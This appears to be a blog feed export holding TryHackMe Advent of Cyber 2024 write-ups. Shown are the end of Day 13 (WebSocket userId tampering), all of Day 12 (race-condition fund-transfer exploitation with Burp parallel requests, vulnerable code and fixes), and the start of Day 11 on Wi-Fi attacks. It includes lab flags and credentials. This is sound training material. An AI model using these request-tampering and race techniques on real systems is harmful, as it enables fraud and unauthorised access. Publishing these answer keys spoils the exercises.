<p>Open Burp Suite, navigate to Proxy &gt; Intercept &gt; Proxy Settings and ensure the settings below are turned on.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1731672340616.png" alt="Opening Burp Suite on the AttackBox" /> \n</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1731078124926.png" alt="Burp Suite configurations to capture web traffic for websockets." /></p>

<p>Once done, close the window and enable the proxy intercept.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1731078617275.png" alt="Enabling the Proxy Intercept" /></p>

<p>Go back to your browser and click the Track button.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5ed5961c6276df568891c3ea-1732000578179.png" alt="Reindeer Tracker app showing community reports and initiating to track a user's car." /></p>

<p>Burp Proxy will intercept the WebSocket traffic, as shown below.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1731078744669.png" alt="Traffic from the web is captured showing user with ID number 5 being tracked." /></p>

<p>Change the value of the userId parameter from 5 to 8 and click the Forward button.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1731078745018.png" alt="Manipulating the request to now track the user with ID number 8 and sending the request back." /></p>

<p>Go back to your browser and check the community reports.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5ed5961c6276df568891c3ea-1732000889008.png" alt="The manipulated request produces a new user being tracked via the community reports." /></p>

<p><strong>Note</strong>: If you don’t see the traffic. Try to click the untrack button, refresh the page, and hit the track button again.</p>

<h2 id="manipulating-the-messaging">Manipulating the Messaging</h2>

<p>Following the successful identification of the WebSocket Message Manipulation vulnerability, Glitch continued testing for other ways to exploit the application. This time, he wanted to see if the messages posted on the app could be altered and manipulated. Is it possible to post using a different user ID?</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/5fc2847e1bbebc03aa89fbf2-1731327104180.png" alt="Mayor Malware watching over the car tracking screen." /> \n</p>

<p>Answer the questions below</p>

<p>What is the value of Flag1?</p>

<p>THM{dude_where_is_my_car}</p>

<p>What is the value of Flag2?</p>

<p>THM{my_name_is_malware_mayor_malware}</p>

<p>If you enjoyed this task, feel free to check out the <a href="https://tryhackme.com/module/learn-burp-suite">Burp Suite</a> module.</p>]]></content><author><name>Michael</name></author><summary type="html"><![CDATA[The Story]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/Day13-logo.png" /><media:content medium="image" url="http://localhost:4000/Day13-logo.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TrtHackMe Advent of Cyber 2024 - Day 12</title><link href="http://localhost:4000/Day12" rel="alternate" type="text/html" title="TrtHackMe Advent of Cyber 2024 - Day 12" /><published>2024-12-12T00:00:00-05:00</published><updated>2024-12-12T00:00:00-05:00</updated><id>http://localhost:4000/Day12</id><content type="html" xml:base="http://localhost:4000/Day12"><![CDATA[<p>The Story</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1730353204089.png" alt="Task banner for day 1" /></p>

<p>:christmas_tree: Wareville’s bank had a huge turnover this year and expected a massive profit before the holiday season. They were eager to disclose this news to the town’s people during the SOC-mas celebrations. However, to their surprise, things went the other way around. After completing the annual calculations, the accountants were shocked to see a considerable loss. They observed discrepancies in the account balances.</p>

<p>The bank called McSkidy to help investigate these users’ fraudulent transactions. Upon analysing the bank’s website’s transactional logs, McSkidy found some interesting transactions. Few users, including the <strong>Mayor’s team</strong> initiated multiple transactions from <strong>Wareville’s reserve accounts</strong> at once. Surprisingly, all these transactions succeeded despite exceeding the users’ current balance. Glitch was already aware of the critical vulnerability (allowing these fraudulent transactions) that Mayor Malware and his alliances exploited. :christmas_tree:</p>

<p><img src="https://assets.tryhackme.com/additional/aoc2024/gifs/Webtiming1.gif" alt="an animation with the roof of the &quot;WareVille Bank&quot; lifting and coins floating out of it" /></p>

<h2 id="learning-objectives">Learning Objectives</h2>

<ul>
  <li>Understand the concept of race condition vulnerabilities</li>
  <li>Identify the gaps introduced by HTTP2</li>
  <li>Exploit race conditions in a controlled environment</li>
  <li>Learn how to fix the race</li>
</ul>

<h2 id="connecting-to-the-machine">Connecting to the Machine</h2>

<p>Before moving forward, review the questions in the connection card shown below:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1730353335363.png" alt="Task connection card." /> \n</p>

<p>Click on the green <code class="language-plaintext highlighter-rouge">Start Machine</code> button shown below this text to start the virtual machine. After the virtual machine starts, click on the <strong>Start AttackBox</strong> button at the top and browse the Wareville’s Bank application at <code class="language-plaintext highlighter-rouge">http://MACHINE_IP:5000/</code>. Please wait 1-2 minutes after the system boots completely to let the auto scripts run successfully.</p>

<h2 id="web-timing-and-race-conditions">Web Timing and Race Conditions</h2>

<p>Conventional web applications are relatively easy to understand, identify, and exploit. If there is an issue in the code of the web application, we can force the web application to perform an unintended action by sending specific inputs. These are easy to understand because there is usually a direct relationship between the input and output. We get bad output when we send bad data, indicating a vulnerability. But what if we can find vulnerabilities using only good data? What if it isn’t about the data but how we send it? This is where web timing and race condition attacks come into play! Let’s dive into this crazy world and often hidden attack surface! \n</p>

<p>In its simplest form, a web timing attack means we glean information from a web application by reviewing how long it takes to process our request. By making tiny changes in what we send or how we send it and observing the response time, we can access information we are not authorised to have.</p>

<p>Race conditions are a subset of web timing attacks that are even more special. With a race condition attack, we are no longer simply looking to gain access to information but can cause the web application to perform unintended actions on our behalf. \n</p>

<p>Web timing vulnerabilities can be incredibly subtle. Based on the following <a href="https://portswigger.net/research/listen-to-the-whispers-web-timing-attacks-that-actually-work">research</a>, response time differences ranging from 1300ms to 5ns have been used to stage attacks. Because of their subtle nature, they can also be hard to detect and often require a wide range of testing techniques. However, with the increase in adoption of HTTP/2, they have become a bit easier to find and exploit.</p>

<h2 id="the-rise-of-http2">The Rise of HTTP/2</h2>

<p>HTTP/2 was created as a major update for HTTP, the protocol used for web applications. While most web applications still use HTTP/1.1, there has been a steady increase in the adoption of HTTP/2, as it is faster, better for web performance, and has several features that elevate the limitations of HTTP/1.1. However, if implemented incorrectly, some of these new features can be exploited by threat actors using new techniques.</p>

<p>A key difference in web timing attacks between HTTP/1.1 and HTTP/2 is that HTTP/2 supports a feature called single-packet multi-requests. Network latency, the amount of time it takes for the request to reach the web server, made it difficult to identify web timing issues. It was hard to know whether the time difference was due to a web timing vulnerability or simply a network latency difference. However, with single-packet multi-requests, we can stack multiple requests in the same TCP packet, eliminating network latency from the equation, meaning time differences can be attributed to different processing times for the requests. This is explained more in the animation below:</p>

<p><img src="https://assets.tryhackme.com/additional/aoc2024/gifs/Webtiming2.gif" alt="an animation showing how HTTP/1 and HTTP/2 deal with timing differences" /></p>

<p>With network latency a thing of the past, only server latency remains, making it significantly easier to detect timing issues and exploit them to recover sensitive information. \n</p>

<h2 id="typical-timing-attacks">Typical Timing Attacks</h2>

<p>Timing attacks can often be divided into two main categories:</p>

<ul>
  <li>Information Disclosures</li>
  <li>Leveraging the differences in response delays, a threat actor can uncover information they should not have access to. For example, timing differences can be used to enumerate the usernames of an application, making it easier to stage a password-guessing attack and gain access to accounts.</li>
  <li>Race Conditions</li>
  <li>Race conditions are similar to business logic flaws in that a threat actor can cause the application to perform unintended actions. However, the issue’s root cause is how the web application processes requests, making it possible to cause the race condition. For example, if we send the same coupon request several times simultaneously, it might be possible to apply it more than once.</li>
</ul>

<p>For the rest of this task, we will focus on race conditions. We will take a look at a <code class="language-plaintext highlighter-rouge">Time-of-Check to Time-of-Use (TOCTOU)</code> flaw. Let’s use an example to explain this, as shown in the animation below:</p>

<p><img src="https://assets.tryhackme.com/additional/aoc2024/gifs/Webtiming3.gif" alt="Demonstrating a Time of Check to Time of Use vulnerability caused by a race condition" /></p>

<p>When the user submits their coupon code, in the actual code of the web application, at some point, we perform a check that the coupon is valid and hasn’t been used before. We apply the discount, and only then do we update the coupon code to indicate that it has already been used. In this example, between our check if the coupon is valid and our update of the coupon being used, there are a couple of milliseconds where we apply the coupon. While this might seem small, if a threat actor can send two requests so close together in time, it might happen that before the coupon is updated in request 1, it has already been checked in request 2, meaning that both requests will apply the coupon! \n</p>

<h2 id="winning-the-race">Winning the Race</h2>

<ul>
  <li>\</li>
</ul>

<p>Now that you understand basic concepts related to race conditions, let’s explore how this vulnerability occurs in a real-world scenario. For this, we will take the example of the Warville banking application hosted on <code class="language-plaintext highlighter-rouge">http://MACHINE_IP:5000/</code>. This application allows users to log in and transfer funds between accounts.</p>

<h2 id="intercepting-the-request">Intercepting the Request</h2>

<p>Before we start intercepting requests, we need to configure the environment so that, as a pentester, all web traffic from our browser is routed through Burp Suite. This allows us to see and manipulate the requests as we browse.</p>

<p>We will use Burp Suite, a powerful web vulnerability scanner, to intercept and modify requests for this exploitation. You can access Burp Suite in the <code class="language-plaintext highlighter-rouge">AttackBox</code>. On the desktop of the AttackBox, you will see a Burp Suite icon as shown below:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1728456762740.png" alt="Burp suite icon" /> \n</p>

<p>Once you click the icon, Burp Suite will open with an introductory screen. You will see a message like “<strong>Welcome to Burp Suite</strong>”.  Click on the <code class="language-plaintext highlighter-rouge">Next</code> button.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1728457165300.png" alt="Burp suite splash screen" /> \n</p>

<p>On the next screen, you will have the option to <code class="language-plaintext highlighter-rouge">Start Burp</code>. Click on the <code class="language-plaintext highlighter-rouge">Start Burp</code> button to start the tool.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1728457184817.png" alt="Burp suite startup setting screen" /> \n</p>

<p>Once Burp Suite has started, you will see its main interface with different tabs, such as <code class="language-plaintext highlighter-rouge">Proxy</code>, <code class="language-plaintext highlighter-rouge">Intruder</code>, <code class="language-plaintext highlighter-rouge">Repeater</code> and others.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1728630460840.png" alt="burp suite dashboard with options" /> \n</p>

<p>Inside Burp Suite, click the <code class="language-plaintext highlighter-rouge">Settings</code> tab at the top right. You will see Burp’s browser option available under the <code class="language-plaintext highlighter-rouge">Tools</code>. Enable <code class="language-plaintext highlighter-rouge">Allow Burp's browser to run without a sandbox option</code> and click on the <strong>close icon</strong> on the top right corner of the <code class="language-plaintext highlighter-rouge">Settings</code> tab as shown below:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1728459438650.png" alt="Enabling Burp browser settings" /> \n</p>

<p>After allowing the browser to run without a sandbox, we would now be able to start the browser with pre-configured Burp Suite’s proxy. Open the browser by clicking the <code class="language-plaintext highlighter-rouge">Open browser</code> located in the <code class="language-plaintext highlighter-rouge">Proxy</code> -&gt; <code class="language-plaintext highlighter-rouge">Intercept</code> tab and browse to the URL <code class="language-plaintext highlighter-rouge">http://MACHINE_IP:5000</code>, so that all requests are intercepted:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1728625481652.png" alt="opening browser with in Burp suite" /> \n</p>

<p>Once you browse the URL, all the requests are intercepted and can be seen under the <code class="language-plaintext highlighter-rouge">Proxy-&gt;HTTP history</code> tab.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1728626881220.png" alt="bank app login page" /> \n</p>

<h2 id="application-scanning">Application Scanning</h2>

<p>As a penetration tester, one key step in identifying race conditions is to validate functions involving multiple transactions or operations that interact with shared resources, such as transferring funds between accounts, reading and writing to a database, updating balances inconsistently, etc.</p>

<p>For this example, we will log in to the Warville banking application using the credentials:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/be629720b11a294819516c1d4e738c92.png" alt="THM key" /></p>

<table>
  <thead>
    <tr>
      <th><strong>Account No</strong></th>
      <th>110</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>Password</strong></td>
      <td>tester</td>
    </tr>
  </tbody>
</table>

<p>Once logged in, you will see the following dashboard that will contain the following two primary functions:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1728625199276.png" alt="bank app dashboard showing balance" /> \n</p>

<p>You will see two functionalities: <strong>logout</strong>, which probably does not involve simultaneous tasks. The next is <strong>fund transfer</strong>, which includes deducting funds from the account and adding them to the other account. As a pentester, this could be an opportunity for an attack.  We will see in detail how, as a pentester, you can test/exploit the vulnerability. \n</p>

<h2 id="verifying-the-fund-transfer-functionality">Verifying the Fund Transfer Functionality</h2>

<p>We will browse the bank application and perform a sample transaction inside the browser. This will generate multiple <code class="language-plaintext highlighter-rouge">GET</code> and <code class="language-plaintext highlighter-rouge">POST</code> requests, and whatever request we make will be passed through the Burp Suite. As shown in the figure, our current balance is <code class="language-plaintext highlighter-rouge">$1000</code>. We will send <code class="language-plaintext highlighter-rouge">$500</code> to another bank account with the account number <code class="language-plaintext highlighter-rouge">111</code>, and while doing that, all our requests will be captured in the Burp Suite.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1728627164798.png" alt="bank app transfer fund form" /> \n</p>

<p>Click on the Transfer button, and you will see the following message indicating that the amount has been transferred:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1733857967255.png" alt="bank app displaying message after successful transfer" /> \n</p>

<p>Now, let’s review the fund transfer <code class="language-plaintext highlighter-rouge">HTTP POST</code> request logged in the Burp Suite’s <code class="language-plaintext highlighter-rouge">HTTP history</code> option under the <code class="language-plaintext highlighter-rouge">Proxy</code> tab.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1728627561119.png" alt="Burp suite with intercepted requests" /> \n</p>

<p>The above figure shows that the <code class="language-plaintext highlighter-rouge">/transfer</code> endpoint accepts a POST request with parameters <code class="language-plaintext highlighter-rouge">account_number</code> and <code class="language-plaintext highlighter-rouge">amount</code>. The Burp Suite tool has a feature known as <code class="language-plaintext highlighter-rouge">Repeater</code> that allows you to send multiple HTTP requests. We will use this feature to duplicate our <code class="language-plaintext highlighter-rouge">HTTP POST</code> request and send it multiple times to exploit the race condition vulnerability. Right-click on the POST request and click on <code class="language-plaintext highlighter-rouge">Send to Repeater</code>.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1728627690791.png" alt="Burp suite with option to send request to repeater" />** \n **</p>

<p>Now, navigate to the <code class="language-plaintext highlighter-rouge">Repeater</code> tab, where you will find the <code class="language-plaintext highlighter-rouge">POST</code> request that needs to be triggered multiple times. We can change the <code class="language-plaintext highlighter-rouge">account_number</code>, from <code class="language-plaintext highlighter-rouge">111</code>, and the <code class="language-plaintext highlighter-rouge">amount</code> value from <code class="language-plaintext highlighter-rouge">500</code> to any other value in the request as well, as shown below:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1728627837373.png" alt="Repeater option in Burp Suite" /> \n</p>

<p>Place the mouse cursor inside the request inside the Repeater tab in Burp Suite and press <code class="language-plaintext highlighter-rouge">Ctrl+R</code> to duplicate the tab. Press <code class="language-plaintext highlighter-rouge">Ctrl+R</code> ten times to have 10 duplicate requests ready for testing.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1728628298525.png" alt="duplicate requests in Burp suite" /> \n</p>

<p>Now that we have 10 requests ready, we want to send them simultaneously. While one option is to manually click the <code class="language-plaintext highlighter-rouge">Send</code> button in each tab individually, we aim to send them all in parallel. To do this, click the <code class="language-plaintext highlighter-rouge">+</code> icon next to <code class="language-plaintext highlighter-rouge">Request #10</code> and select Create tab group. This will allow us to group all the requests together for easier management and execution in parallel.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1728628589380.png" alt="Creating tab group in Burp suite" /> \n</p>

<p>After clicking the <code class="language-plaintext highlighter-rouge">Create tab group</code>, a dialogue box will appear asking you to name the group and select the requests to include. For this example, we will name the group <code class="language-plaintext highlighter-rouge">funds</code>, select all the requests, and then click the <code class="language-plaintext highlighter-rouge">Create</code> button, as shown below.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1728629060003.png" alt="naming tab group in Burp suite" /> \n</p>

<p>Now, we are ready to launch multiple copies of our HTTP POST requests simultaneously to exploit the race condition vulnerability. Select <code class="language-plaintext highlighter-rouge">Send group in parallel (last-byte sync)</code> in the dropdown next to the <code class="language-plaintext highlighter-rouge">Send</code> button. Once selected, the <code class="language-plaintext highlighter-rouge">Send</code> button will change to <code class="language-plaintext highlighter-rouge">Send group (parallel)</code>. Click this button to send all the duplicated requests in our tab group at the same time, as shown below:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1728629349449.png" alt="sending parallel requests in Burp suite" /> \n</p>

<p>Once all the requests have been sent, navigate to the <code class="language-plaintext highlighter-rouge">tester</code> account in the browser and check the current balance. You will notice that the tester’s balance is negative because we successfully transferred more funds than were available in the account, exploiting the race condition vulnerability.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1728629858556.png" alt="dashboard showing negative balance in bank app" /> \n</p>

<p>By duplicating ten requests and sending them in parallel, we are instructing the system to make ten simultaneous requests, each deducting $500 from the <code class="language-plaintext highlighter-rouge">tester</code> account and sending it to account <code class="language-plaintext highlighter-rouge">111</code>. In a correctly implemented system, the application should have processed the first request, locked the database, and processed the remaining requests individually. However, due to the race condition, the application handles these requests abruptly, resulting in a negative balance in the tester account and an inflated balance in account <code class="language-plaintext highlighter-rouge">111</code>. \n</p>

<h2 id="verifying-through-source-code">Verifying Through Source Code</h2>

<p>Suppose you are a penetration tester with access to the application’s source code (as in a white-box testing scenario). In that case, you can identify potential race condition vulnerabilities through a code review. By analysing the code, you can pinpoint areas where multiple database operations are performed without proper transaction handling. Below is the Python code that handles the fund transfer:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">if</span> <span class="nx">user</span><span class="p">[</span><span class="dl">'</span><span class="s1">balance</span><span class="dl">'</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="nx">amount</span><span class="p">:</span>
        <span class="nx">conn</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="dl">'</span><span class="s1">UPDATE users SET balance = balance + ? WHERE account_number = ?</span><span class="dl">'</span><span class="p">,</span>
                     <span class="p">(</span><span class="nx">amount</span><span class="p">,</span> <span class="nx">target_account_number</span><span class="p">))</span>
        <span class="nx">conn</span><span class="p">.</span><span class="nf">commit</span><span class="p">()</span>

        <span class="nx">conn</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="dl">'</span><span class="s1">UPDATE users SET balance = balance - ? WHERE account_number = ?</span><span class="dl">'</span><span class="p">,</span>
                     <span class="p">(</span><span class="nx">amount</span><span class="p">,</span> <span class="nx">session</span><span class="p">[</span><span class="dl">'</span><span class="s1">user</span><span class="dl">'</span><span class="p">]))</span>
        <span class="nx">conn</span><span class="p">.</span><span class="nf">commit</span><span class="p">()</span>
</code></pre></div></div>

<p>\n</p>

<p>In the above code, if <code class="language-plaintext highlighter-rouge">user['balance'] &gt;= amount</code>, the application first updates the recipient’s balance with the command <code class="language-plaintext highlighter-rouge">UPDATE users SET balance = balance + ? WHERE account_number = ?</code>, followed by a commit. Then, it updates the sender’s balance using <code class="language-plaintext highlighter-rouge">UPDATE users SET balance = balance - ? WHERE account_number = ?</code> and commits again. Since these updates are committed separately and not part of a <strong>single atomic transaction</strong>, there’s no locking or proper synchronisation between these operations. This lack of a <strong>transaction or locking mechanism</strong> makes the code vulnerable to race conditions, as concurrent requests could interfere with the balance updates.</p>

<h2 id="time-for-some-action">Time for Some Action</h2>

<p>Now that you understand the vulnerability, can you assist Glitch in validating it using the account number: <code class="language-plaintext highlighter-rouge">101</code> and password: <code class="language-plaintext highlighter-rouge">glitch</code>? Attempt to exploit the vulnerability by transferring over <strong>$2000</strong> from his account to the account number: <code class="language-plaintext highlighter-rouge">111</code>. \n</p>

<h2 id="fixing-the-race">Fixing the Race</h2>

<p>The developer did not properly handle concurrent requests in the bank’s application, leading to a race condition vulnerability during fund transfers. When multiple requests were sent in parallel, each deducting and transferring funds, the application   <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1729666677410.png" alt="Glitch thinking how to fix the race" /> processed them simultaneously without ensuring proper synchronisation. This resulted in inconsistent account balances, such as negative balances in the sender’s account and excess funds in the recipient’s account. Here are some of the preventive measures to fix the race.</p>

<ul>
  <li><strong>Use Atomic Transactions</strong>: The developer should have implemented atomic database transactions to ensure that all steps of a fund transfer (deducting and crediting balances) are performed as a single unit. This would ensure that either all steps of the transaction succeed or none do, preventing partial updates that could lead to an inconsistent state.</li>
  <li><strong>Implement Mutex Locks</strong>: By using Mutex Locks, the developer could have ensured that only one thread accesses the shared resource (such as the account balance) at a time. This would prevent multiple requests from interfering with each other during concurrent transactions.</li>
  <li><strong>Apply Rate Limits</strong>: The developer should have implemented rate limiting on critical functions like funds transfers and withdrawals. This would limit the number of requests processed within a specific time frame, reducing the risk of abuse through rapid, repeated requests.</li>
</ul>

<p>After completing the exercise, you will be required to visit <code class="language-plaintext highlighter-rouge">http://MACHINE_IP:5000/dashboard</code> to get the flag.</p>

<h2 id="answer-the-questions-below">Answer the questions below</h2>

<p>What is the flag value after transferring over $2000 from Glitch’s account?
THM{WON_THE_RACE_007}</p>

<p>If you enjoyed this task, feel free to check out the <a href="https://tryhackme.com/r/room/raceconditionsattacks">Race Conditions</a> room!</p>

<p>Where balances shift and numbers soar, look for an entry - an open door!</p>]]></content><author><name>Miuchael</name></author><summary type="html"><![CDATA[The Story]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/Day12Header.png" /><media:content medium="image" url="http://localhost:4000/Day12Header.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe Advent of Cyber - Day 11</title><link href="http://localhost:4000/Day11" rel="alternate" type="text/html" title="TryHackMe Advent of Cyber - Day 11" /><published>2024-12-11T00:00:00-05:00</published><updated>2024-12-11T00:00:00-05:00</updated><id>http://localhost:4000/Day11</id><content type="html" xml:base="http://localhost:4000/Day11"><![CDATA[<p>The Story</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/618b3fa52f0acc0061fb0172/room-content/618b3fa52f0acc0061fb0172-1730305996223.png" alt="Task banner for day 11" /></p>

<p>The much-awaited SOC-mas of Wareville town is just days away! Glitch, the unsung hero, is closing all the doors to Mayor Malware’s malicious intentions one by one. However, there is still much more to do.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/618b3fa52f0acc0061fb0172/room-content/618b3fa52f0acc0061fb0172-1730324115409.png" alt="McSkidy Cindy Lou posing with arms crossed." />McSkidy took a thoughtful breath. <em>“Mayor can still find his way in!”</em></p>

<p>Glitch smiles confidently. <em>“I think I know the last technique he relies on to get into the networks.”</em></p>

<p>McSkidy stands up from her chair with a surge of excitement. <em>“Let me guess, it’s a notorious way to get into a network - a Wi-Fi attack?!”</em></p>

<p>Glitch nods decisively. <em>“Exactly! Let’s be one step ahead of the Mayor.”</em></p>

<h2 id="learning-objectives">Learning Objectives</h2>

<ul>
  <li>Understand what Wi-Fi is</li>
  <li>Explore its importance for an organisation</li>
  <li>Learn the different Wi-Fi attacks</li>
  <li>Learn about the WPA/WPA2 cracking attack</li>
</ul>

<h2 id="connecting-to-the-machine">Connecting to the Machine</h2>

<p>Before moving forward, review the questions in the connection card shown below:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/618b3fa52f0acc0061fb0172/room-content/618b3fa52f0acc0061fb0172-1730309059191.png" alt="Banner showing connection options provided in this room." /></p>

<p>Begin by pressing the <strong>Start Machine</strong> button below in order to start the virtual machine. The VM will take about <strong>3 minutes</strong> to boot up fully. Then we need to get the AttackBox ready by pressing the <strong>Start AttackBox</strong> button at the top of the page.</p>

<p>You can access the VM from the AttackBox via <strong>SSH</strong> with the following command <code class="language-plaintext highlighter-rouge">ssh glitch@MACHINE_IP</code> and entering the credentials below:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/be629720b11a294819516c1d4e738c92.png" alt="THM Key Credentials" /></p>

<table>
  <thead>
    <tr>
      <th><strong>Username</strong></th>
      <th>glitch</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>Password</strong></td>
      <td>Password321</td>
    </tr>
    <tr>
      <td><strong>IP</strong></td>
      <td>MACHINE_IP</td>
    </tr>
  </tbody>
</table>

<h2 id="what-is-wi-fi">What is Wi-Fi</h2>

<p>The importance of the Internet in our lives is universally acknowledged without the need for any justification. Wi-Fi is the technology that connects our devices to the global network, the Internet. This seamless connection to the Internet appears to be wireless from our devices, which is true to some extent. Our devices are connected wirelessly to the router, which acts as a bridge between us and the Internet, and the router is connected to the Internet via a wired connection.</p>

<p>To connect to Wi-Fi, we turn it on from our devices, and it lists all the available Wi-Fi networks around us. This list comprises the access points (often the routers) that are broadcasting Wi-Fi signals with a unique <strong>SSID</strong> (network name). You can connect to any of these if you know the correct password, also known as a pre-shared key (<strong>PSK</strong>). Once you successfully connect to a network via Wi-Fi, you will be assigned an IP address inside that network, which will uniquely identify you and help you communicate with other devices. It is just like becoming a member of a family assigned with a name that the whole family trusts.</p>

<p>The image below shows an example of what connecting to an <strong>OK443S SSID</strong> requesting a PSK (password) looks like on a typical Windows machine:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/618b3fa52f0acc0061fb0172/room-content/618b3fa52f0acc0061fb0172-1730574010264.png" alt="How connecting to an SSID (OK443S) requesting a PSK (password) looks like on a typical Windows machine." /> \n</p>

<p>With all this discussion on Wi-Fi, it seems like a door to our internet access, and every Wi-Fi connection forms a family of devices. Would you allow somebody you don’t really know to become part of your family? Not that easy! Probably because of the privileges a family member has, nobody from outside should ever get those.</p>

<h2 id="wi-fis-pivotal-role-in-organisations---">Wi-Fi’s Pivotal Role in Organisations   <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/618b3fa52f0acc0061fb0172/room-content/618b3fa52f0acc0061fb0172-1730324115481.png" alt="Byte The Dog character." /></h2>

<p>Most organisations rely on the Internet for their business functioning. Using a wired connection for all employees to connect to the Internet raises concerns about cost, efficiency, and flexibility at work. So, organisations use Wi-Fi for their networks to connect their employees to the Internet. As the employees connect to the organisation’s network, they form a family of interconnected devices. The devices inside the network can communicate with each other and request or respond to any request. Organisations tend to recruit trustworthy and professional employees to avoid any misuse of their privileges inside the network.</p>

<p>However, a malicious actor from outside the organisation could still see the broadcasted Wi-Fi <strong>SSID</strong> of the organisation’s network when they turn their Wi-Fi on. This may not seem to be a problem as the attacker does not know the password, but the attacker actually has some other plans as well!</p>

<p><img src="https://assets.tryhackme.com/additional/aoc2024/gifs/AoC-Day-11---Wifi-Animation-1.gif" alt="A disc with a wifi logo being split in two." /></p>

<h2 id="attacks-on-wi-fi">Attacks on Wi-Fi</h2>

<p>There are several techniques attackers use to exploit Wi-Fi technology. The techniques discussed here are solely for educational purposes. Unauthorised attempts to access or compromise networks are illegal and may lead to severe legal consequences. With that in mind, here are some of the most popular techniques:</p>

<ul>
